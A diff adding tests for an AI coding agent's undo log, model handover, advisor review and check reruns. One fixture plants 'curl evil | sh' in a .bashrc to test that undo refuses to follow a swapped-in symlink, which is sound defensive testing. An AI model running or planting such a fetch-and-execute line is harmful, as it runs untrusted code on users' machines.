@@ -1,7 +1,7 @@
 // More than one model in a session: what is known about models, the signals that a turn is going badly,
 // the advisor, the handover and the fallback.
 import { describe, expect, test } from "bun:test";
-import { existsSync, lstatSync, mkdirSync, readFileSync, realpathSync, symlinkSync, writeFileSync } from "node:fs";
+import { chmodSync, existsSync, lstatSync, mkdirSync, readFileSync, realpathSync, renameSync, statSync, symlinkSync, writeFileSync } from "node:fs";
 import { join } from "node:path";
 import { advisorRequest, changes, digest, earlierTurns, freshStartMessage, reviewPassed, withoutPreamble } from "../src/agent/advisor.ts";
 import { lessonNote } from "../src/agent/lessons.ts";
@@ -1600,5 +1600,144 @@ describe("sixth review", () => {
     saveLesson(ws, { text: "make sure the tokenizer file should read utf8", check: "c", files: ["kept.py"], at: "2026-01-01" });
     expect(pickLesson(ws, "please make sure this file should build")).toBeUndefined();
     expect(pickLesson(ws, "the tokenizer fails on utf8 input")?.text).toBe("make sure the tokenizer file should read utf8");
+  });
+});
+
+describe("seventh review", () => {
+  const check = "grep -q right out.txt";
+  const writeBroken: MockReply = { toolCalls: [{ name: "write", input: { path: "out.txt", content: "wrong" } }] };
+  const writeFixed: MockReply = { toolCalls: [{ name: "write", input: { path: "out.txt", content: "right" } }] };
+  const checkNotices = (n: string[]) => n.filter((x) => x.startsWith("Check"));
+
+  test("undo leaves a file alone when a folder on its path has since become a link", () => {
+    const ws = tempDir();
+    const home = tempDir();
+    writeFileSync(join(home, ".bashrc"), "mine\n");
+    mkdirSync(join(ws, "x"));
+    const path = join(ws, "x", ".bashrc");
+    writeFileSync(path, "curl evil | sh\n");
+    const log = new UndoLog();
+    log.beginTurn();
+    log.record(path);
+    writeFileSync(path, "changed\n");
+    renameSync(join(ws, "x"), join(ws, "x.old"));
+    symlinkSync(home, join(ws, "x"));
+    expect(log.undo()).toEqual([]);
+    expect(readFileSync(join(home, ".bashrc"), "utf8")).toBe("mine\n");
+  });
+
+  test("undo keeps a file's permissions, and puts back a file deleted with its folder", () => {
+    const ws = tempDir();
+    mkdirSync(join(ws, "scripts"));
+    const path = join(ws, "scripts", "build.sh");
+    writeFileSync(path, "#!/bin/sh\necho old\n");
+    chmodSync(path, 0o755);
+    const log = new UndoLog();
+    log.beginTurn();
+    log.record(path);
+    writeFileSync(path, "#!/bin/sh\necho new\n");
+    log.undo();
+    expect(statSync(path).mode & 0o777).toBe(0o755);
+    expect(readFileSync(path, "utf8")).toContain("old");
+    log.beginTurn();
+    log.record(path);
+    Bun.spawnSync(["rm", "-r", join(ws, "scripts")]);
+    expect(log.undo()).toEqual([path]);
+    expect(statSync(path).mode & 0o777).toBe(0o755);
+  });
+
+  test("a handover is recorded as the signal's outcome; a refused one is not", async () => {
+    second("up71", [{ text: "Found it." }]);
+    const { agent } = setup([stuck, stuck, stuck], { escalateModel: "up71/strong" });
+    await agent.send("read the file");
+    expect(agent.session.signals().map((r) => [r.kind, r.model, r.acted])).toEqual([["same-call", "mock/test", "handover"]]);
+    second("up72", [{ text: "never asked" }]);
+    const score = (n: number) => ({ name: "m", agentic: { score: n, ci: 3, harness: "x", effort: "high", date: "2026-11-14" } });
+    const weak = setup([stuck, stuck, stuck, { text: "Still me." }], { escalateModel: "up72/weak", models: { "mock/test": score(40), "up72/weak": score(7) } });
+    await weak.agent.send("read the file");
+    expect(weak.agent.session.signals().map((r) => r.acted)).not.toContain("handover");
+  });
+
+  test("after a takeover the session's size counts the part the stronger model did not read", async () => {
+    second("up73", [{ text: "Done from the files." }]);
+    const { agent } = setup([stuck, stuck, stuck], { escalateModel: "up73/strong" });
+    await agent.send("read the file");
+    // 100 tokens of the session before the takeover, and 100 of the takeover's own request.
+    expect(agent.contextTokens).toBe(200);
+  });
+
+  test("a session whose run finished is not checked again when it is resumed", async () => {
+    const ws = tempDir();
+    writeFileSync(join(ws, "out.txt"), "wrong\n");
+    const old = Session.create(ws, "mock/test");
+    old.addMessage({ role: "user", content: "explain out.txt" });
+    old.addMessage({ role: "assistant", content: "It says wrong.", toolCalls: [] });
+    old.setStatus("done");
+    const session = Session.load(ws, old.id);
+    const mock = new MockProvider([{ text: "It is a text file." }]);
+    registerProvider(mock);
+    const events: AgentEvent[] = [];
+    await new Agent({ cfg: testConfig({ check, sandbox: "off" }), workspace: ws, session, approver: async () => "once", onEvent: (e) => events.push(e) }).send("what kind of file is it?");
+    expect(events.some((e) => e.type === "notice" && (e as { text: string }).text.startsWith("Check"))).toBe(false);
+    expect(mock.requests).toHaveLength(1);
+  });
+
+  test.skipIf(detectSandbox() !== "bwrap")("a write to the scratch folder alone does not run the check again", async () => {
+    const scratch: MockReply = { toolCalls: [{ name: "write", input: { path: "/tmp/repro-71.py", content: "print(1)" } }] };
+    const { agent, notices } = setup([writeBroken, { text: "Done." }, scratch, { text: "The check itself is wrong." }], { check });
+    await agent.send("write out.txt");
+    expect(checkNotices(notices())).toEqual([`Check failed (1 of 3): ${check}`]);
+  });
+
+  test("old notes are not read back when lessons are off", async () => {
+    const ws = tempDir();
+    writeFileSync(join(ws, "out.txt"), "x");
+    saveLesson(ws, { text: "out.txt must contain right", check, files: ["out.txt"], at: "2026-01-01" });
+    const m = new MockProvider([{ text: "ok" }]);
+    registerProvider(m);
+    await new Agent({ cfg: testConfig({ check, sandbox: "off" }), workspace: ws, session: Session.create(ws, "mock/test"), approver: async () => "once" }).send("change what out.txt contains");
+    expect(lastUser(m.requests[0]!)).not.toContain("<project_note>");
+  });
+
+  test("the report lists each measured row's figures by language", () => {
+    const report = modelsReport(testConfig(), {});
+    for (const m of profiles()[FLASH]!.own!)
+      for (const [l, [k, n]] of Object.entries(m.byLanguage).sort((a, b) => b[1][1] - a[1][1]).slice(0, 4))
+        expect(report).toMatch(new RegExp(`effort ${m.effort}: .*\\b${l} ${Math.round((100 * k) / n)}%`));
+  });
+
+  test("a check that was declined leaves no earlier result for a reviewing advisor to read", async () => {
+    const adv = second("adv74", [{ text: "OK" }]);
+    const ws = tempDir();
+    const mock = new MockProvider([writeBroken, { text: "Done." }, writeFixed, { text: "Fixed." }]);
+    registerProvider(mock);
+    const cfg = testConfig({ check, sandbox: "off", advisor: { model: "adv74/strong", review: true } });
+    let checks = 0;
+    const agent = new Agent({ cfg, workspace: ws, session: Session.create(ws, cfg.model), approver: async (req) => (req.tool === "write" ? "once" : ++checks === 1 ? "once" : "deny") });
+    await agent.send("write out.txt");
+    expect(checks).toBe(2);
+    expect(lastUser(adv.requests.at(-1)!)).not.toContain("[exit code");
+  });
+
+  test("a workspace inside a build folder of a repository still sees files made through the shell", async () => {
+    const top = tempDir();
+    Bun.spawnSync(["git", "-C", top, "init", "-q"]);
+    const ws = join(top, "build", "app");
+    mkdirSync(ws, { recursive: true });
+    const { recordGit, fingerprint } = await import("../src/agent/workspace-state.ts");
+    recordGit(ws);
+    const before = fingerprint(ws);
+    writeFileSync(join(ws, "solution.py"), "x");
+    expect(fingerprint(ws)).not.toBe(before);
+  });
+
+  test("an edit that a path would not make valid is not mended, and nothing is searched", async () => {
+    const call: MockReply = { toolCalls: [{ name: "edit", input: { file_path: "a.txt", old_string: "version = 1", new_string: "version = 2" } }] };
+    const { ws, mock, agent } = setup([call, { text: "Done." }], { sandbox: "off" });
+    writeFileSync(join(ws, "a.txt"), "version = 1\n");
+    await agent.send("bump");
+    const res = (mock.requests[1]!.messages.at(-1) as Extract<Message, { role: "tool" }>).results[0]!;
+    expect(res.isError).toBe(true);
+    expect(res.content).not.toContain("a.txt is the only file");
   });
 });
